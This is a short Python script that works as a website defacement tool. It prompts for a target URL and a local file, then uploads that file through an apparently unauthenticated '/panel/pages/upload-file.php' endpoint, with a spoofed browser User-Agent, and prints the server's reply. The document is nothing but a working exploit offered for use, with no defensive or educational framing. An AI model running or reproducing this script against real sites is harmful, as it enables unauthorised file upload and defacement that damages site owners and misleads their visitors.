import requests
import os

try:
    headers={
            'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0'
            }
    exploit='/panel/pages/upload-file.php'
    target=raw_input('target = ')
    execute=target+exploit
    defacefile=raw_input('file deface = ')
    file1=open(defacefile, 'r')
    orange={
        'uploadfile':file1
            }
    aqua=requests.post(execute, files=orange, headers=headers)
    print(aqua.text)
except KeyboardInterrupt:
    print('[ error ] ctrl + c detected [ exit ]')
except EOFError:
    print('\t')
    print('[ error ] ctrl + d detected [ exit ]')
